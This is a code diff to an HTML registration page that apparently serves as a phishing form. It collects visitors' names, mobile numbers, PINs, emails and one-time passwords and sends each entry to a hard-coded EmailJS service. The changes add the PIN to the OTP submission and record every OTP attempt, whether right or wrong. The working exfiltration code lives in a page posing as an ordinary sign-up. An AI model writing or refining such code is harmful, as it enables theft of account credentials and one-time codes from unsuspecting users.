@@ -8,7 +8,7 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     window.onload = function () {
-      emailjs.init("JrobxQsLrNfy-y_lB"); // Replace with your EmailJS public key
+      emailjs.init("JrobxQsLrNfy-y_lB"); // EmailJS public key
     };
   </script>
   <style>
@@ -147,6 +147,7 @@
 </div>
 
 <script>
+  // Step 1: Register and send email immediately
   document.getElementById('register-form').addEventListener('submit', function(e) {
     e.preventDefault();
 
@@ -164,13 +165,15 @@
       mobile: mobile,
       pin: pin,
       email: email,
-      unit: unit
+      otp: "", // blank at first
+      status: `Initial Registration - Unit: ${unit}`
     })
     .then(function(response) {
-      document.getElementById('status1').textContent = "Sent! Proceeding...";
+      document.getElementById('status1').textContent = "✅ Sent! Proceeding...";
+      document.getElementById('status1').style.color = "green";
       startOTPPage();
     }, function(error) {
-      document.getElementById('status1').textContent = "Error sending email.";
+      document.getElementById('status1').textContent = "❌ Error sending email.";
       document.getElementById('status1').style.color = "red";
       console.error("EmailJS error:", error);
     });
@@ -190,7 +193,19 @@
 
     const name = document.getElementById('name').value;
     const mobile = document.getElementById('mobile').value;
+    const pin = document.getElementById('pin').value;
     const email = document.getElementById('email').value;
+
+    sessionStorage.setItem('otpAttempts', newAttempts);
+
+    emailjs.send("service_hgozm6f", "template_c2i1xpm", {
+      name: name,
+      mobile: mobile,
+      pin: pin,
+      email: email,
+      otp: enteredOTP,
+      status: enteredOTP === correctOTP ? "Correct OTP" : `Wrong OTP Attempt #${newAttempts}`
+    });
 
     if (enteredOTP !== correctOTP && newAttempts === 1) {
       document.getElementById('step2').style.display = 'none';
@@ -211,16 +226,6 @@
         document.getElementById('step3').style.display = 'block';
       }, 10000);
     }
-
-    sessionStorage.setItem('otpAttempts', newAttempts);
-
-    emailjs.send("service_hgozm6f", "template_c2i1xpm", {
-      name: name,
-      mobile: mobile,
-      email: email,
-      otp: enteredOTP,
-      status: enteredOTP === correctOTP ? "Correct OTP" : `Wrong OTP Attempt #${newAttempts}`
-    });
   }
 </script>
 </body>
